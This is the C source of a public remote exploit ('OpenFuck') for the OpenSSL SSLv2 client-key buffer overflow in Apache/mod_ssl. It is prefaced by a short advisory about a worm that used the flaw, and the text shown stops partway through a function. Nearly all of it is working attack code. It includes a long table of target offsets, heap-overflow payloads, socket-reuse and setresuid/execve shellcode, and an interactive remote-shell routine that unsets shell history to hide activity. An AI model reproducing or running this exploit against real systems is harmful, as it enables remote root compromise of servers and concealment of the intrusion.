/*
source: https://www.securityfocus.com/bid/5363/info

A buffer-overflow vulnerability has been reported in some versions of OpenSSL.

The issue occurs in the handling of the client key value during the negotiation of the SSLv2 protocol. A malicious client may be able to exploit this vulnerability to execute arbitrary code as the vulnerable server process or possibly to create a denial-of-service condition.

***UPDATE: A worm that likely exploits this vulnerability has been discovered propagating in the wild. Additionally, this code includes peer-to-peer and distributed denial-of-service capabilities. There have been numerous reports of intrusions in Europe. It is not yet confirmed whether this vulnerability is in OpenSSL, mod_ssl, or another component. Administrators are advised to upgrade to the most recent versions or to disable Apache, if possible, until more information is available.
*/

/*
 * VERY PRIV8 spabam SPAX@zone-h.org
 * Compile with: gcc -o OpenFuck OpenFuck.c -lcrypto
 *
 */

#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <errno.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>

#include <openssl/ssl.h>
#include <openssl/rsa.h>
#include <openssl/x509.h>
#include <openssl/evp.h>

/* update this if you add architectures */
#define MAX_ARCH 131

struct archs {
	char* desc;
	int func_addr;	/* objdump -R /usr/sbin/apache | grep free */
} architectures[] = {

        {
                "Caldera OpenLinux (apache-1.3.26)",
                0x080920e0
        },
	{
		"Cobalt Sun 6.0 (apache-1.3.12)",
		0x8120f0c
	},
	{
		"Cobalt Sun 6.0 (apache-1.3.20)",
		0x811dcb8
	},
	{
		"Cobalt Sun x (apache-1.3.26)",
		0x8123ac3
	},
	{
		"Cobalt Sun x Fixed2 (apache-1.3.26)",
		0x81233c3
	},
	{
		"Conectiva 4 (apache-1.3.6)",
		0x08075398
	},
	{
		"Conectiva 4.1 (apache-1.3.9)",
		0x0808f2fe
	},
	{
		"Conectiva 6 (apache-1.3.14)",
		0x0809222c
	},
	{
		"Conectiva 7 (apache-1.3.12)",
		0x0808f874
	},
	{
		"Conectiva 7 (apache-1.3.19)",
		0x08088aa0
	},
	{
		"Conectiva 7/8 (apache-1.3.26)",
		0x0808e628
	},
	{
		"Conectiva 8 (apache-1.3.22)",
		0x0808b2d0
	},
	{
		"Debian GNU Linux 2.2 Potato (apache_1.3.9-14.1)",
		0x08095264
	},
	{
		"Debian GNU Linux (apache_1.3.19-1)",
		0x080966fc
	},
	{
		"Debian GNU Linux (apache_1.3.22-2)",
		0x08096aac
	},
	{
		"Debian GNU Linux (apache-1.3.22-2.1)",
		0x08083828
	},
	{
		"Debian GNU Linux (apache-1.3.22-5)",
		0x08083728
	},
	{
		"Debian GNU Linux (apache_1.3.23-1)",
		0x08085de8
	},
	{
		"Debian GNU Linux (apache_1.3.24-2.1)",
		0x08087d08
	},
        {       "Debian Linux GNU Linux 2 (apache_1.3.24-2.1)",
	        0x080873ac
	},
	{
		"Debian GNU Linux (apache_1.3.24-3)",
		0x08087d68
	},
	{
		"Debian GNU Linux (apache-1.3.26-1)",
		0x0080863c4
	},
	{
		"Debian GNU Linux 3.0 Woody (apache-1.3.26-1)",
		0x080863cc
	},
	{       "Debian GNU Linux (apache-1.3.27)",
	        0x0080866a3
	},

	/* targets de BSD */

{ "FreeBSD (apache-1.3.9)", 0xbfbfde00 },
{ "FreeBSD (apache-1.3.11)", 0x080a2ea8 },
{ "FreeBSD (apache-1.3.12.1.40)", 0x080a7f58 },
{ "FreeBSD (apache-1.3.12.1.40)", 0x080a0ec0 },
{ "FreeBSD (apache-1.3.12.1.40)", 0x080a7e7c },
{ "FreeBSD (apache-1.3.12.1.40_1)", 0x080a7f18 },
{ "FreeBSD (apache-1.3.12)", 0x0809bd7c },
{ "FreeBSD (apache-1.3.14)", 0xbfbfdc00 },
{ "FreeBSD (apache-1.3.14)", 0x080ab68c },
{ "FreeBSD (apache-1.3.14)", 0x0808c76c },
{ "FreeBSD (apache-1.3.14)", 0x080a3fc8 },
{ "FreeBSD (apache-1.3.14)", 0x080ab6d8 },
{ "FreeBSD (apache-1.3.17_1)", 0x0808820c },
{ "FreeBSD (apache-1.3.19)", 0xbfbfdc00 },
{ "FreeBSD (apache-1.3.19_1)", 0x0808c96c },
{ "FreeBSD (apache-1.3.20)", 0x0808cb70 },
{ "FreeBSD (apache-1.3.20)", 0xbfbfc000 },
{ "FreeBSD (apache-1.3.20+2.8.4)", 0x0808faf8 },
{ "FreeBSD (apache-1.3.20_1)", 0x0808dfb4 },
{ "FreeBSD (apache-1.3.22)", 0xbfbfc000 },
{ "FreeBSD (apache-1.3.22_7)", 0x0808d110 },
{ "FreeBSD (apache_fp-1.3.23)", 0x0807c5f8 },
{ "FreeBSD (apache-1.3.24_7)", 0x0808f8b0 },
{ "FreeBSD (apache-1.3.24+2.8.8)", 0x080927f8 },
{ "FreeBSD 4.6.2-Release-p6 (apache-1.3.26)", 0x080c432c },
{ "FreeBSD 4.6-Realease (apache-1.3.26)", 0x0808fdec },
{ "FreeBSD (apache-1.3.27)", 0x080902e4 },



	{
		"Gentoo Linux (apache-1.3.24-r2)",
		0x08086c34
	},
	{
		"Mandrake Linux X.x (apache-1.3.22-10.1mdk)",
		0x080808ab
	},
	{
		"Mandrake Linux 7.1 (apache-1.3.14-2)",
		0x0809f6c4
	},
	{
		"Mandrake Linux 7.1 (apache-1.3.22-1.4mdk)",
		0x0809d233
	},
	{
		"Mandrake Linux 7.2 (apache-1.3.14-2mdk)",
		0x0809f6ef
	},
	{
		"Mandrake Linux 7.2 (apache-1.3.14) 2",
		0x0809d6c4
	},
	{
		"Mandrake Linux 7.2 (apache-1.3.20-5.1mdk)",
		0x0809ccde
	},
	{
		"Mandrake Linux 7.2 (apache-1.3.20-5.2mdk)",
		0x0809ce14
	},
	{
		"Mandrake Linux 7.2 (apache-1.3.22-1.3mdk)",
		0x0809d262
	},
	{
		"Mandrake Linux 7.2 (apache-1.3.22-10.2mdk)",
		0x08083545
	},
	{
		"Mandrake Linux 8.0 (apache-1.3.19-3)",
		0x0809ea98
	},
	{
		"Mandrake Linux 8.1 (apache-1.3.20-3)",
		0x0809e97c
	},
	{
		"Mandrake Linux 8.2 (apache-1.3.23-4)",
		0x08086580
	},
	{       "Mandrake Linux 8.2 #2 (apache-1.3.23-4)",
	        0x08086484
	},
	{       "Mandrake Linux 8.2 (apache-1.3.24)",
	        0x08086665
	},
	{
		"RedHat Linux ?.? GENERIC (apache-1.3.12-1)",
		0x0808c0f4
	},
	{
		"RedHat Linux GENERIC (marumbi) (apache-1.2.6-5)",
		0x080d2c35
	},
	{
		"RedHat Linux 4.2 (apache-1.1.3-3)",
		0x08065bae
	},
	{
		"RedHat Linux 5.0 (apache-1.2.4-4)",
		0x0808c82c
	},
	{
		"RedHat Linux 5.1-Update (apache-1.2.6)",
		0x08092a45
	},
	{
		"RedHat Linux 5.1 (apache-1.2.6-4)",
		0x08092c2d
	},
	{
		"RedHat Linux 5.2 (apache-1.3.3-1)",
		0x0806f049
	},
	{
		"RedHat Linux 5.2-Update (apache-1.3.14-2.5.x)",
		0x0808e4d8
	},
	{
		"RedHat Linux 6.0 (apache-1.3.6-7)",
		0x080707ec
	},
	{
		"RedHat Linux 6.0 (apache-1.3.6-7)",
		0x080707f9
	},
	{
		"RedHat Linux 6.0-Update (apache-1.3.14-2.6.2)",
		0x0808fd52
	},
	{
		"RedHat Linux 6.0 Update (apache-1.3.24)",
		0x80acd58
	},
	{
		"RedHat Linux 6.1 (apache-1.3.9-4)1",
		0x0808ccc4
	},
	{
		"RedHat Linux 6.1 (apache-1.3.9-4)2",
		0x0808ccdc
	},
	{
		"RedHat Linux 6.1-Update (apache-1.3.14-2.6.2)",
		0x0808fd5d
	},
	{
		"RedHat Linux 6.1-fp2000 (apache-1.3.26)",
		0x082e6fcd
	},
	{
		"RedHat Linux 6.2 (apache-1.3.12-2)1",
		0x0808f689
	},
	{
		"RedHat Linux 6.2 (apache-1.3.12-2)2",
		0x0808f614
	},
	{
		"RedHat Linux 6.2 update (apache-1.3.22-5.6)1",
		0x0808f9ec
	},
	{
		"RedHat Linux 6.2-Update (apache-1.3.22-5.6)2",
		0x0808f9d4
	},
	{
		"Redhat Linux 7.x (apache-1.3.22)",
		0x0808400c
	},
	{
		"RedHat Linux 7.x (apache-1.3.26-1)",
		0x080873bc
	},
	{       "RedHat Linux 7.x (apache-1.3.27)",
	        0x08087221
	},
	{
		"RedHat Linux 7.0 (apache-1.3.12-25)1",
		0x0809251c
	},
	{
		"RedHat Linux 7.0 (apache-1.3.12-25)2",
		0x0809252d
	},
	{
		"RedHat Linux 7.0 (apache-1.3.14-2)",
		0x08092b98
	},
        {
		"RedHat Linux 7.0-Update (apache-1.3.22-5.7.1)",
		0x08084358
	},
	{
		"RedHat Linux 7.0-7.1 update (apache-1.3.22-5.7.1)",
		0x0808438c
	},
	{
		"RedHat Linux 7.0-Update (apache-1.3.27-1.7.1)",
		0x08086e41
	},
	{
		"RedHat Linux 7.1 (apache-1.3.19-5)1",
		0x0809af8c
	},
	{
		"RedHat Linux 7.1 (apache-1.3.19-5)2",
		0x0809afd9
	},
	{
		"RedHat Linux 7.1-7.0 update (apache-1.3.22-5.7.1)",
		0x0808438c
	},
	{
		"RedHat Linux 7.1-Update (1.3.22-5.7.1)",
		0x08084389
	},
        {
		"RedHat Linux 7.1 (apache-1.3.22-src)",
	        0x0816021c
        },
        {
		"RedHat Linux 7.1-Update (1.3.27-1.7.1)",
		0x08086ec89
	},
	{
		"RedHat Linux 7.2 (apache-1.3.20-16)1",
		0x080994e5
	},
	{
		"RedHat Linux 7.2 (apache-1.3.20-16)2",
		0x080994d4
	},
	{
		"RedHat Linux 7.2-Update (apache-1.3.22-6)",
		0x08084045
	},
	{
		"RedHat Linux 7.2 (apache-1.3.24)",
		0x80b0938
	},
	{
		"RedHat Linux 7.2 (apache-1.3.26)",
		0x08161c16
	},
	{
		"RedHat Linux 7.2 (apache-1.3.26-snc)",
		0x8161c14
	},
	{

		"Redhat Linux 7.2 (apache-1.3.26 w/PHP)1",
		0x08269950
	},
	{
		"Redhat Linux 7.2 (apache-1.3.26 w/PHP)2",
		0x08269988
	},
	{
		"RedHat Linux 7.2-Update (apache-1.3.27-1.7.2)",
		0x08086af9
	},
	{
		"RedHat Linux 7.3 (apache-1.3.23-11)1",
		0x0808528c
	},
	{
		"RedHat Linux 7.3 (apache-1.3.23-11)2",
		0x0808525f
	},
	{       "RedHat Linux 8.0 (apache-1.3.27)",
	        0x08084c1c
        },
        {       "RedHat Linux 8.0-second (apache-1.3.27)",
                0x0808151e
        },
	{
		"Slackware Linux 4.0 (apache-1.3.6)",
		0x08088130
	},
	{
		"Slackware Linux 7.0 (apache-1.3.9)",
		0x080a7fc0
	},
	{
		"Slackware Linux 7.0 (apache-1.3.26)",
		0x083d37fc
	},
        {       "Slackware 7.0  (apache-1.3.26)2",
		0x083d2232
	},
	{
		"Slackware Linux 7.1 (apache-1.3.12)",
		0x080a86a4
	},
	{
		"Slackware Linux 8.0 (apache-1.3.20)",
		0x080ae67c
	},
	{
		"Slackware Linux 8.1 (apache-1.3.24)",
		0x080b0c60
	},
	{
		"Slackware Linux 8.1 (apache-1.3.26)",
		0x080b2100
	},

	{
		"Slackware Linux 8.1-stable (apache-1.3.26)",
		0x080b0c60
	},
	{       "Slackware Linux (apache-1.3.27)",
	        0x080b1a3a
	},
	{
		"SuSE Linux 7.0 (apache-1.3.12)",
		0x0809f54c
	},
	{
		"SuSE Linux 7.1 (apache-1.3.17)",
		0x08099984
	},
	{
		"SuSE Linux 7.2 (apache-1.3.19)",
		0x08099ec8
	},
	{
		"SuSE Linux 7.3 (apache-1.3.20)",
		0x08099da8
	},
	{
		"SuSE Linux 8.0 (apache-1.3.23)",
		0x08086168
	},
	{
		"SUSE Linux 8.0 (apache-1.3.23-120)",
		0x080861c8
	},
	{
		"SuSE Linux 8.0 (apache-1.3.23-137)",
		0x080861c8
	},
	{
		"Yellow Dog Linux/PPC 2.3 (apache-1.3.22-6.2.3a)",
		0xfd42630
	},

/*
 * Offset still unchecked
 * some guys giveme them
 */

{
	"RedHat Linux 6.0 (apache-1.3.6-7)",
	0x080707ec
},
{
	"RedHat Linux 6.1 (apache-1.3.9-4)",
	0x0808ccc4
},
{
	"RedHat Linux 6.2 (apache-1.3.12-2)",
	0x0808f614
},
{
	"RedHat Linux 7.0 (apache-1.3.12-25)",
	0x0809251c
},
{
	"RedHat Linux 7.1 (apache-1.3.19-5)",
	0x0809af8c
},
{
	"RedHat Linux 7.2 (apache-1.3.20-16)",
	0x080994d4
},
{
	"RedHat Linux 7.2 (apache 1.3.26-src)",
	0x08161c14
},
{
	"RedHat Linux 7.3 (apache-1.3.23-11)",
	0x0808528c
},
{
	"SuSE Linux 7.0 (apache-1.3.12)",
	0x0809f54c
},
{
	"SuSE Linux 7.1 (apache-1.3.17)",
	0x08099984
},
{
	"SuSE Linux 7.2 (apache-1.3.19)",
	0x08099ec8
},
{
	"SuSE Linux 7.3 (apache-1.3.20)",
	0x08099da8
},
{
	"SuSE Linux 8.0 (apache-1.3.23)",
	0x08086168
},
{
	"SuSE Linux 8.0 (apache-1.3.23) second",
	0x080861c8
},
{
	"Mandrake Linux 7.1 (apache-1.3.14-2)",
	0x0809d6c4
},
{
	"Mandrake Linux 8.0 (apache-1.3.19-3)",
	0x0809ea98
},
{
	"Mandrake Linux 8.1 (apache-1.3.20-3)",
	0x0809e97c
},
{
	"Mandrake Linux 8.2 (apache-1.3.23-4)",
	0x08086580
},
{
	"Slackware 7.1 (apache-1.3.26)",
	0x083d37fc
},
{
        "Slackware 8.0 (apache-1.3.22)",
        0x08102b78
},
{
	"Slackware 8.1 (apache-1.3.26)",
	0x080b2100
},

};

extern int errno;

int cipher;
int ciphers;

/* the offset of the local port from be beginning of the overwrite next chunk buffer */
#define FINDSCKPORTOFS     208 + 12 + 46

unsigned char overwrite_session_id_length[] =
	"AAAA"								/* int master key length; */
	"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"	/* unsigned char master key[SSL MAX MASTER KEY LENGTH];
*/
	"\x70\x00\x00\x00";					/* unsigned int session id length; */

unsigned char overwrite_next_chunk[] =
	"AAAA"								/* int master key length; */
	"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"	/* unsigned char master key[SSL MAX MASTER KEY LENGTH];
*/
	"AAAA"								/* unsigned int session id length; */
	"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"	/* unsigned char session id[SSL MAX SSL SESSION ID LENGTH]; */
	"AAAA"								/* unsigned int sid ctx length; */
	"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"	/* unsigned char sid ctx[SSL MAX SID CTX LENGTH]; */
	"AAAA"								/* int not resumable; */
	"\x00\x00\x00\x00"					/* struct sess cert st *sess cert; */
	"\x00\x00\x00\x00"					/* X509 *peer; */
	"AAAA"								/* long verify result; */
	"\x01\x00\x00\x00"					/* int references; */
	"AAAA"								/* int timeout; */
	"AAAA"								/* int time */
	"AAAA"								/* int compress meth; */
	"\x00\x00\x00\x00"					/* SSL CIPHER *cipher; */
	"AAAA"								/* unsigned long cipher id; */
	"\x00\x00\x00\x00"					/* STACK OF(SSL CIPHER) *ciphers; */
	"\x00\x00\x00\x00\x00\x00\x00\x00"	/* CRYPTO EX DATA ex data; */
	"AAAAAAAA"							/* struct ssl session st *prev,*next; */

	"\x00\x00\x00\x00"					/* Size of previous chunk */
	"\x11\x00\x00\x00"					/* Size of chunk, in bytes */
	"fdfd"								/* Forward and back pointers */
	"bkbk"
	"\x10\x00\x00\x00"					/* Size of previous chunk */
	"\x10\x00\x00\x00"					/* Size of chunk, PREV INUSE is set */

/* shellcode start */
    "\xeb\x0a\x90\x90"	/* jump 10 bytes ahead, land at shellcode */
    "\x90\x90\x90\x90"
    "\x90\x90\x90\x90"	/* this is overwritten with FD by the unlink macro */

/* 72 bytes findsckcode by LSD-pl */
    "\x31\xdb"             /* xorl    %ebx,%ebx              */
    "\x89\xe7"             /* movl    %esp,%edi              */
    "\x8d\x77\x10"         /* leal    0x10(%edi),%esi        */
    "\x89\x77\x04"         /* movl    %esi,0x4(%edi)         */
    "\x8d\x4f\x20"         /* leal    0x20(%edi),%ecx        */
    "\x89\x4f\x08"         /* movl    %ecx,0x8(%edi)         */
    "\xb3\x10"             /* movb    $0x10,%bl              */
    "\x89\x19"             /* movl    %ebx,(%ecx)            */
    "\x31\xc9"             /* xorl    %ecx,%ecx              */
    "\xb1\xff"             /* movb    $0xff,%cl              */
    "\x89\x0f"             /* movl    %ecx,(%edi)            */
    "\x51"                 /* pushl   %ecx                   */
    "\x31\xc0"             /* xorl    %eax,%eax              */
    "\xb0\x66"             /* movb    $0x66,%al              */
    "\xb3\x07"             /* movb    $0x07,%bl              */
    "\x89\xf9"             /* movl    %edi,%ecx              */
    "\xcd\x80"             /* int     $0x80                  */
    "\x59"                 /* popl    %ecx                   */
    "\x31\xdb"             /* xorl    %ebx,%ebx              */
    "\x39\xd8"             /* cmpl    %ebx,%eax              */
    "\x75\x0a"             /* jne     <findsckcode+54>       */
    "\x66\xb8\x12\x34"     /* movw    $0x1234,%bx            */
    "\x66\x39\x46\x02"     /* cmpw    %bx,0x2(%esi)          */
    "\x74\x02"             /* je      <findsckcode+56>       */
    "\xe2\xe0"             /* loop    <findsckcode+24>       */
    "\x89\xcb"             /* movl    %ecx,%ebx              */
    "\x31\xc9"             /* xorl    %ecx,%ecx              */
    "\xb1\x03"             /* movb    $0x03,%cl              */
    "\x31\xc0"             /* xorl    %eax,%eax              */
    "\xb0\x3f"             /* movb    $0x3f,%al              */
    "\x49"                 /* decl    %ecx                   */
    "\xcd\x80"             /* int     $0x80                  */
    "\x41"                 /* incl    %ecx                   */
    "\xe2\xf6"             /* loop    <findsckcode+62>       */

/* 10 byte setresuid(0,0,0); by core */
     "\x31\xc9"       /* xor    %ecx,%ecx */
     "\xf7\xe1"       /* mul    %ecx,%eax */
     "\x51"           /* push   %ecx */
     "\x5b"           /* pop    %ebx */
     "\xb0\xa4"       /* mov    $0xa4,%al */
     "\xcd\x80"       /* int    $0x80 */


/* bigger shellcode added by spabam */

/* "\xB8\x2F\x73\x68\x23\x25\x2F\x73\x68\xDC\x50\x68\x2F\x62\x69"
        "\x6E\x89\xE3\x31\xC0\x50\x53\x89\xE1\x04\x0B\x31\xD2\xCD\x80"
*/


/* 24 bytes execl("/bin/sh", "/bin/sh", 0); by LSD-pl */
    "\x31\xc0"             /* xorl    %eax,%eax              */
    "\x50"                 /* pushl   %eax                   */
    "\x68""//sh"           /* pushl   $0x68732f2f            */
    "\x68""/bin"           /* pushl   $0x6e69622f            */
    "\x89\xe3"             /* movl    %esp,%ebx              */
    "\x50"                 /* pushl   %eax                   */
    "\x53"                 /* pushl   %ebx                   */
    "\x89\xe1"             /* movl    %esp,%ecx              */
    "\x99"                 /* cdql                           */
    "\xb0\x0b"             /* movb    $0x0b,%al              */
    "\xcd\x80";             /* int     $0x80                  */

/* read and write buffer*/
#define BUFSIZE 16384

/* hardcoded protocol stuff */
#define CHALLENGE_LENGTH 16
#define RC4_KEY_LENGTH 16	/* 128 bits */
#define RC4_KEY_MATERIAL_LENGTH (RC4_KEY_LENGTH*2)

/* straight from the openssl source */
#define n2s(c,s)    ((s=(((unsigned int)(c[0]))<< 8)| (((unsigned int)(c[1]))    )),c+=2)
#define s2n(s,c)    ((c[0]=(unsigned char)(((s)>> 8)&0xff), c[1]=(unsigned char)(((s)    )&0xff)),c+=2)

/* we keep all SSL2 state in this structure */
typedef struct {
	int sock;

	/* client stuff */
	unsigned char challenge[CHALLENGE_LENGTH];
	unsigned char master_key[RC4_KEY_LENGTH];
	unsigned char key_material[RC4_KEY_MATERIAL_LENGTH];

	/* connection id - returned by the server */
	int conn_id_length;
	unsigned char conn_id[SSL2_MAX_CONNECTION_ID_LENGTH];

	/* server certificate */
	X509 *x509;

	/* session keys */
	unsigned char* read_key;
	unsigned char* write_key;
	RC4_KEY* rc4_read_key;
	RC4_KEY* rc4_write_key;

	/* sequence numbers, used for MAC calculation */
	int read_seq;
	int write_seq;

	/* set to 1 when the SSL2 handshake is complete */
	int encrypted;
} ssl_conn;

#define COMMAND1 "TERM=xterm; export TERM=xterm; exec bash -i\n"
#define COMMAND2 "unset HISTFILE; uname -a; id; echo SPABAM R0X; pwd; w;\n"

long getip(char *hostname) {
	struct hostent *he;
	long ipaddr;

	if ((ipaddr = inet_addr(hostname)) < 0) {
		if ((he = gethostbyname(hostname)) == NULL) {
			perror("gethostbyname()");
			exit(-1);
		}
		memcpy(&ipaddr, he->h_addr, he->h_length);
	}
	return ipaddr;
}

/* mixter's code w/enhancements by core */

int sh(int sockfd) {
   char snd[1024], rcv[1024];
   fd_set rset;
   int maxfd, n;

   /* Priming commands */
   strcpy(snd, COMMAND1 "\n");
   write(sockfd, snd, strlen(snd));

   strcpy(snd, COMMAND2 "\n");
   write(sockfd, snd, strlen(snd));

   /* Main command loop */
   for (;;) {
      FD_SET(fileno(stdin), &rset);
      FD_SET(sockfd, &rset);

      maxfd = ( ( fileno(stdin) > sockfd )?fileno(stdin):sockfd ) + 1;
      select(maxfd, &rset, NULL, NULL, NULL);

      if (FD_ISSET(fileno(stdin), &rset)) {
	 bzero(snd, sizeof(snd));
	 fgets(snd, sizeof(snd)-2, stdin);
	 write(sockfd, snd, strlen(snd));
      }

      if (FD_ISSET(sockfd, &rset)) {
	 bzero(rcv, sizeof(rcv));

	 if ((n = read(sockfd, rcv, sizeof(rcv))) == 0) {
	    printf("Good Bye!\n");
	    return 0;
	 }

	 if (n < 0) {
	    perror("read");
	    return 1;
	 }

	 fputs(rcv, stdout);
	 fflush(stdout); /* keeps output nice */
      }
   } /* for(;;) */
}

/* Returns the local port of a connected socket */
int get_local_port(int sock)
{
	struct sockaddr_in s_in;
	unsigned int namelen = sizeof(s_in);

	if (getsockname(sock, (struct sockaddr *)&s_in, &namelen) < 0) {
		printf("Can't get local port: %s\n", strerror(errno));
		exit(1);
	}

	return s_in.sin_port;
}

/* Connect to a host */
int connect_host(char* host, int port)
{
	struct sockaddr_in s_in;
	int sock;

	s_in.sin_family = AF_INET;
	s_in.sin_addr.s_addr = getip(host);
	s_in.sin_port = htons(port);

	if ((sock = socket(AF_INET, SOCK_STREAM, 0)) <= 0) {
		printf("Could not create a socket\n");
		exit(1);
	}

	if (connect(sock, (struct sockaddr *)&s_in, sizeof(s_in)) < 0) {
		printf("Connection to %s:%d failed: %s\n", host, port, strerror(errno));
		exit(1);
	}

	return sock;
}

/* Create a new ssl conn structure and connect to a host */
ssl_conn* ssl_connect_host(char* host, int port)
{
	ssl_conn* ssl;

	if (!(ssl = (ssl_conn*) malloc(sizeof(ssl_conn)))) {
		printf("Can't allocate memory\n");
		exit(1);
	}

	/* Initialize some values */
	ssl->encrypted = 0;
	ssl->write_seq = 0;
	ssl->read_seq = 0;

	ssl->sock = connect_host(host, port);

	return ssl;
}

/* global buffer used by the ssl result() */
char res_buf[30];

/* converts an SSL error code to a string */
char* ssl_error(int code) {
	switch (code) {
		case 0x00:	return "SSL2 PE UNDEFINED ERROR (0x00)";
		case 0x01:	return "SSL2 PE NO CIPHER (0x01)";
		case 0x02:	return "SSL2 PE NO CERTIFICATE (0x02)";
		case 0x04:	return "SSL2 PE BAD CERTIFICATE (0x03)";
		case 0x06:	return "SSL2 PE UNSUPPORTED CERTIFICATE TYPE (0x06)";
	default:
		sprintf(res_buf, "%02x", code);
		return res_buf;
	}
}

/* read len bytes from a socket. boring. */
int read_data(int sock, unsigned char* buf, int len)
{
	int l;
	int to_read = len;

	do {
		if ((l = read(sock, buf, to_read)) < 0) {
			printf("Error in read: %s\n", strerror(errno));
			exit(1);
		}
		to_read -= len;
	} while (to_read > 0);

	return len;
}

/* reads an SSL packet and decrypts it if necessery */
int read_ssl_packet(ssl_conn* ssl, unsigned char* buf, int buf_size)
{
	int rec_len, padding;

	read_data(ssl->sock, buf, 2);

	if ((buf[0] & 0x80) == 0) {
		/* three byte header */
		rec_len = ((buf[0] & 0x3f) << 8) | buf[1];
		read_data(ssl->sock, &buf[2], 1);
		padding = (int)buf[2];
	}
	else {
		/* two byte header */
		rec_len = ((buf[0] & 0x7f) << 8) | buf[1];
		padding = 0;
	}

	if ((rec_len <= 0) || (rec_len > buf_size)) {
		printf("read_ssl_packet: Record length out of range (rec_len = %d)\n", rec_len);
		exit(1);
	}

	read_data(ssl->sock, buf, rec_len);

	if (ssl->encrypted) {
		if (MD5_DIGEST_LENGTH + padding >= rec_len) {
			if ((buf[0] == SSL2_MT_ERROR) && (rec_len == 3)) {
				/* the server didn't switch to encryption due to an error */
				return 0;
			}
			else {
				printf("read_ssl_packet: Encrypted message is too short (rec_len = %d)\n", rec_len);
				exit(1);
			}
		}

		/* decrypt the encrypted part of the packet */
		RC4(ssl->rc4_read_key, rec_len, buf, buf);

		/* move the decrypted message in the beginning of the buffer */
		rec_len = rec_len - MD5_DIGEST_LENGTH - padding;
		memmove(buf, buf + MD5_DIGEST_LENGTH, rec_len);
	}

	if (buf[0] == SSL2_MT_ERROR) {
		if (rec_len != 3) {
			printf("Malformed server error message\n");
			exit(1);
		}
		else {
			return 0;
		}
	}

	return rec_len;
}

/* send an ssl packet, encrypting it if ssl->encrypted is set */
void send_ssl_packet(ssl_conn* ssl, unsigned char* rec, int rec_len)
{
	unsigned char buf[BUFSIZE];
	unsigned char* p;
	int tot_len;
	MD5_CTX ctx;
	int seq;


	if (ssl->encrypted)
		tot_len = rec_len + MD5_DIGEST_LENGTH;	/* RC4 needs no padding */
	else
		tot_len = rec_len;

	if (2 + tot_len > BUFSIZE) {
		printf("send_ssl_packet: Record length out of range (rec_len = %d)\n", rec_len);
		exit(1);
	}

	p = buf;
	s2n(tot_len, p);

	buf[0] = buf[0] | 0x80;	/* two byte header */

	if (ssl->encrypted) {
		/* calculate the MAC */
		seq = ntohl(ssl->write_seq);

		MD5_Init(&ctx);
		MD5_Update(&ctx, ssl->write_key, RC4_KEY_LENGTH);
		MD5_Update(&ctx, rec, rec_len);
		MD5_Update(&ctx, &seq, 4);
		MD5_Final(p, &ctx);

		p+=MD5_DIGEST_LENGTH;

		memcpy(p, rec, rec_len);

		/* encrypt the payload */
		RC4(ssl->rc4_write_key, tot_len, &buf[2], &buf[2]);

	}
	else {
		memcpy(p, rec, rec_len);
	}

	send(ssl->sock, buf, 2 + tot_len, 0);

	/* the sequence number is incremented by both encrypted and plaintext packets
*/
	ssl->write_seq++;
}

/* Send a CLIENT HELLO message to the server */
void send_client_hello(ssl_conn *ssl)
{
	int i;
	unsigned char buf[BUFSIZE] =
		"\x01"			/* client hello msg */

		"\x00\x02"		/* client version */
		"\x00\x18"		/* cipher specs length */
		"\x00\x00"		/* session id length */
		"\x00\x10"		/* challenge length */

		"\x07\x00\xc0\x05\x00\x80\x03\x00"	/* cipher specs data */
		"\x80\x01\x00\x80\x08\x00\x80\x06"
		"\x00\x40\x04\x00\x80\x02\x00\x80"

		"";									/* session id data */

	/* generate CHALLENGE LENGTH bytes of challenge data */
	for (i = 0; i < CHALLENGE_LENGTH; i++) {
		ssl->challenge[i] = (unsigned char) (rand() >> 24);
	}
	memcpy(&buf[33], ssl->challenge, CHALLENGE_LENGTH);

	send_ssl_packet(ssl, buf, 33 + CHALLENGE_LENGTH);
}

/* Get a SERVER HELLO response from the server */
void get_server_hello(ssl_conn* ssl)
{
	unsigned char buf[BUFSIZE];
	unsigned char *p, *end;
	int len;
	int server_version, cert_length, cs_length, conn_id_length;
	int found;

	if (!(len = read_ssl_packet(ssl, buf, sizeof(buf)))) {
		printf("Server error: %s\n", ssl_error(ntohs(*(uint16_t*)&buf[1])));
		exit(1);
	}
	if (len < 11) {
		printf("get_server_hello: Packet too short (len = %d)\n", len);
		exit(1);
	}

	p = buf;

	if (*(p++) != SSL2_MT_SERVER_HELLO) {
		printf("get_server_hello: Expected SSL2 MT SERVER HELLO, got %x\n", (int)p[-1]);
		exit(1);
	}

	if (*(p++) != 0) {
		printf("get_server_hello: SESSION-ID-HIT is not 0\n");
		exit(1);
	}

	if (*(p++) != 1) {
		printf("get_server_hello: CERTIFICATE-TYPE is not SSL CT X509 CERTIFICATE\n");
		exit(1);
	}

	n2s(p, server_version);
	if (server_version != 2) {
		printf("get_server_hello: Unsupported server version %d\n", server_version);
		exit(1);
	}

	n2s(p, cert_length);
	n2s(p, cs_length);
	n2s(p, conn_id_length);

	if (len != 11 + cert_length + cs_length + conn_id_length) {
		printf("get_server_hello: Malformed packet size\n");
		exit(1);
	}

	/* read the server certificate */
	ssl->x509 = NULL;
	ssl->x509=d2i_X509(NULL,&p,(long)cert_length);
	if (ssl->x509 == NULL) {
		printf("get server hello: Cannot parse x509 certificate\n");
		exit(1);
	}

	if (cs_length % 3 != 0) {
		printf("get server hello: CIPHER-SPECS-LENGTH is not a multiple of 3\n");
		exit(1);
	}

	found = 0;
	for (end=p+cs_length; p < end; p += 3) {
		if ((p[0] == 0x01) && (p[1] == 0x00) && (p[2] == 0x80))
			found = 1;	/* SSL CK RC4 128 WITH MD5 */
	}

	if (!found) {
		printf("get server hello: Remote server does not support 128 bit RC4\n");
		exit(1);
	}

	if (conn_id_length > SSL2_MAX_CONNECTION_ID_LENGTH) {
		printf("get server hello: CONNECTION-ID-LENGTH is too long\n");
		exit(1);
	}

	/* The connection id is sent back to the server in the CLIENT FINISHED packet */
	ssl->conn_id_length = conn_id_length;
	memcpy(ssl->conn_id, p, conn_id_length);
}

/* Send a CLIENT MASTER KEY message to the server */

void send_client_master_key(ssl_conn* ssl, unsigned char* key_arg_overwrite, int key_arg_overwrite_len) {
	int encrypted_key_length, key_arg_length, record_length;
	unsigned char* p;
	int i;
